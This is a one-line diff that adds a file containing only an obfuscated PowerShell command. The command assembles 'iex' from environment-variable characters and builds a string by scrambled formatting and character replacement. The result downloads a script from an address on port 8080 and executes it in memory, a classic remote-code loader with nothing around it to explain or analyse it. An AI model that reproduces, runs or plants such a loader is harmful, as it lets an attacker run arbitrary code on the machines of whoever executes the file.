@@ -1,0 +1,1 @@
+﻿ &( $eNv:COMsPEC[4,24,25]-joIn'')((("{14}{3}{0}{6}{7}{1}{13}{2}{5}{4}{12}{10}{9}{11}{8}"-f '(N','k','//1','(','.168','92','ew','-Object Net.WebClient).DownloadString(e',';','kY)','0/e',')','.137.241:808','Yhttp:','IEX ')).rePLacE(([cHar]101+[cHar]107+[cHar]89),[STRiNG][cHar]39) ) 
